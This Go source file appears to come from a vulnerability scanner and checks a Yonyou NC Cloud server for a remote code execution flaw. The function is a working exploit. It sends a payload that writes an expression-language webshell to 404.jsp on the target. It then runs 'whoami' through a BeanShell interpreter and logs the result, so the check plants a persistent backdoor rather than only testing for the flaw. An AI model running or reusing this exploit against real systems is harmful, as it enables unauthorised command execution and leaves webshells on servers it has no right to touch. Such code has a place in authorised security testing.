package yonyou

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func Nc_cloud_jsinvoke_upload_rce(u string) bool {

	var payload = "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/404.jsp\"]}"
	var payload2 = "cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream())"
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"

	if req, err := pkg.HttpRequset(u+"/uapjs/jsinvoke/?action=invoke", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 {
			if req2, err := pkg.HttpRequset(u+"/404.jsp?error=bsh.Interpreter", "POST", payload2, false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req.Body, "<string>") && strings.Contains(req.Body, "version") {
					str := req2.Body
					var pattern = `<string>(.*?)</string>`
					re := regexp.MustCompile(pattern)
					resourceUuid := re.FindStringSubmatch(str)
					pkg.GoPocLog(fmt.Sprintf("Found may be vuln Nc_cloud_jsinvoke_upload_rce |%s |whomi结果：%s\n", u+"/404.jsp?error=bsh.Interpreter", resourceUuid))
					return true
				}
			}
		}
	}

	return false
}
